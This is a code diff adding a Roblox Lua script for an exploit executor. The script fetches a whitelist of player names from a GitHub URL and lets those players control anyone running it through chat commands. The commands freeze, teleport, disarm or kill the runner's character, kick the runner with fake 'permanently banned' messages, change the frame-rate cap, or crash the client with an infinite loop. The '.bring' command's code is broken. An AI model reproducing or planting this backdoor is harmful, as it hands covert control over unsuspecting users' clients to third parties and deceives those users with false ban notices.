@@ -1,1 +1,100 @@
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local TextChatService = game:GetService("TextChatService")
+local ReplicatedStorage = game:FindService("ReplicatedStorage")
+local RunService = game:GetService("RunService")
 
+local isLegacyChat = TextChatService.ChatVersion == Enum.ChatVersion.LegacyChatService
+
+local LocalPlayer = Players.LocalPlayer
+
+local function chatMessage(str)
+    str = tostring(str)
+    if not isLegacyChat then
+        TextChatService.TextChannels.RBXGeneral:SendAsync(str)
+    else
+        ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(str, "All")
+    end
+end
+
+local whitelistedplayers = HttpService:JSONDecode(http_request({Url = "https://raw.githubusercontent.com/vexalotl/Chants/refs/heads/main/cool", Method = "GET"}).Body)
+
+local command = {
+    frozen = false,
+    disarm = false
+}
+
+local pos = {}
+
+local function CommandHandler(player, msg)
+    if not whitelistedplayers[player.Name] then return end
+    if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("Humanoid") or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then repeat task.wait() until LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") end
+    
+    local args = msg:split(" ")
+    if args[2] ~= LocalPlayer.Name and args[2] ~= "all" then return end
+    if player.Name == LocalPlayer.Name then return end
+    
+    if args[1] == "Ping!" then
+        chatMessage("Pong!")
+    end
+    if args[1] == ".freeze" then
+        pos.freeze = LocalPlayer.Character.HumanoidRootPart.CFrame
+        command.frozen = true
+    end
+    if args[1] == ".unfreeze" then
+        pos.freeze = LocalPlayer.Character.HumanoidRootPart.CFrame
+        command.frozen = false
+    end
+    if args[1] == ".loopdisarm" then
+        command.disarm = true
+    end
+    if args[1] == ".unloopdisarm" then
+        command.disarm = false
+    end
+    if args[1] == ".bring" then
+        pos.freeze = player.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame
+        LocalPlayer.Character.HumanoidRootPart.CFrame = player.LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame
+    end
+    if args[1] == ".kick" then
+        LocalPlayer:Kick("\n\nYou have been kicked by Chants.")
+    end
+    if args[1] == ".ban" then
+        LocalPlayer:Kick("\n\nYOU HAVE BEEN PERMANENTLY BANNED!")
+    end
+    if args[1] == ".crash" then
+        while true do end
+    end
+    if args[1] == ".fps" then
+        setfpscap(args[3])
+    end
+    if args[1] == ".kill" then
+        LocalPlayer.Character.Humanoid.Health = 0
+    end
+end
+
+for _, player in pairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(msg)
+        CommandHandler(player, msg)
+    end)
+end
+
+
+Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(msg)
+        CommandHandler(player, msg)
+    end)
+end)
+
+RunService.RenderStepped:Connect(function()
+    if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("Humanoid") or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then repeat task.wait() until LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") end
+
+    if command.frozen then
+        LocalPlayer.Character.HumanoidRootPart.CFrame = pos.freeze
+    end
+
+    if command.disarm then
+        if LocalPlayer.Character:FindFirstChildWhichIsA("Tool") then
+            LocalPlayer.Character:FindFirstChildWhichIsA("Tool").Parent = LocalPlayer:FindFirstChild("Backpack")
+        end
+    end
+end)
